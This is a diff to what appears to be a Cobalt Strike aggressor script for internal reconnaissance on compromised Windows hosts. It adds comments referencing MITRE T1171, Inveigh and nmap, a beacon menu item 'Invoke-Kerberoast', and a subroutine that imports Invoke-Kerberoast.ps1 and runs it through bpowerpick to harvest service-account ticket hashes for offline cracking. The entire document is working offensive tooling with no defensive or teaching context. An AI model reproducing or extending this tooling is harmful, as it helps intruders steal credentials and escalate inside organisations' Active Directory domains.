@@ -3,6 +3,11 @@
 #  Implement SMB Scanner module
 #  Implement Linux port scan module
 #  Implement linux responder module
+#  
+#  MITRE ID: T1171
+#  Add inveigh functionality
+#
+#  Add nmap functionality
 
 popup beacon_top {
 	menu "&Internal Recon"{
@@ -66,6 +71,12 @@ popup beacon_top {
 					local('$bid');
 					foreach $bid ($1) {
 						getNetSubnet($bid);
+					}
+				}
+				item "&Invoke-Kerberoast" {
+					local('$bid');
+					foreach $bid ($1) {
+						invokeKerberoast($bid);
 					}
 				}			
 			}
@@ -143,6 +154,16 @@ sub getNetDomain {
 	}
 	else {
 		berror($1, "PowerView.ps1 must be in the same directory as this script.");
+	}
+}
+
+sub invokeKerberoast {
+	$bid = $1;
+
+	if (-exists script_resource("Invoke-Kerberoast.ps1")) {
+		bpowershell_import($bid, script_resource("Invoke-Kerberoast.ps1"));
+		$pscmd = "Invoke-Kerberoast";
+		bpowerpick($1, $pscmd);
 	}
 }
 
